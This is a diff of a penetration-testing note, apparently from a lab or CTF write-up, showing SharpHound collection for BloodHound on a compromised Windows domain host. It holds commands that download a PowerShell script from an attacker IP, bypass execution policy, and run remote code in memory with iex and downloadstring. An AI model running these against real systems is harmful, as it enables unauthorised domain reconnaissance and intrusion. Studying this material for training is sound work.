@@ -13,7 +13,19 @@ BANK.LOCAL -ns 10.10.10.175 -c All
 
 ### **SharpHound**
 
-With my shell, I’ll run [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors) to collect data for [BloodHound](https://github.com/BloodHoundAD/BloodHound). I’ve got a copy of Bloodhound on my machine (you can use `git clone https://github.com/BloodHoundAD/BloodHound.git` if you don’t). I’ll start a Python webserver in the `Ingestors` directory, and then load it in to my current session:
+{% code title="" overflow="wrap" lineNumbers="true" %}
+```
+iwr -uri http://192.168.45.242/SharpHound.ps1 -Outfile SharpHound.ps1 
+powershell.exe -ep bypass
+Import-Module .\SharpHound.ps1  
+Get-Help Invoke-BloodHound
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "corp audit" 
+```
+{% endcode %}
+
+
+
+With my shell, I’ll run [SharpHound ](https://github.com/BloodHoundAD/SharpHound/releases)to collect data for [BloodHound](https://github.com/BloodHoundAD/BloodHound). I’ve got a copy of Bloodhound on my machine (you can use `git clone https://github.com/BloodHoundAD/BloodHound.git` if you don’t). I’ll start a Python webserver in the `Ingestors` directory, and then load it in to my current session:
 
 ```
 *Evil-WinRM* PS C:\Users\svc-alfresco\appdata\local\temp> iex(new-object net.webclient).downloadstring("http://10.10.16.12:8080/SharpHound.ps1")
